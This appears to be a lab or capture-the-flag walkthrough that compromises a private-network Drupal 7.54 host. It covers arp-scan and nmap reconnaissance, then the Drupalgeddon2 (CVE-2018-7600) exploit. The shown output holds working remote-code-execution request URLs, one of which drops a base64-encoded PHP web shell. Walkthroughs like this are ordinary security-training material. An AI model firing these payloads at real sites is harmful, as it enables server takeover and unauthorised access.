Discover the IP using arp-scan <br>
```
arp-scan -l -I en1 -v
Interface: en1, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
192.168.0.105	08:00:27:e5:04:1a	CADMUS COMPUTER SYSTEMS
```

Check the services/ports exposed

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http?   syn-ack
1898/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
```

From the generator header, we can see that the application is running on Drupal and version probably 7 <br>
**Also, there is an interesting file ```CHANGELOG.txt``` which might expose the accurate version used under 7.x**

```
Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
```

Now that we have figured the exact version, let's check if there are any exploits available. 

From [CVE-2018-7600-Drupal-RCE](https://github.com/g0rx/CVE-2018-7600-Drupal-RCE) and [Druppalgeddon2](https://github.com/dreadlocked/Drupalgeddon2), we can see that the Drupal version is vulnerable to RCE.
Let's pull the exploit and run it after installing the latest version of Ruby. 

**Always check the exploit before running + switch on verbose mode if there is, it is easy to trip IDS/IPS with weird filenames. Above exploit creates a file named s.php (and an obvious User Agent header 'druppalgeddon') and auto uploads to the server**

```
[*] Testing: Code Execution   (Method: name)
[v] HTTP - URL : http://192.168.0.105:1898/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo XMVRLQYC
[+] Result : XMVRLQYC
[v] HTTP - URL : http://192.168.0.105:1898/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee lampioaa.php
```

Luckily the exploit which we ran, automatically creates a shell and prompts us with a a minimal CLI.
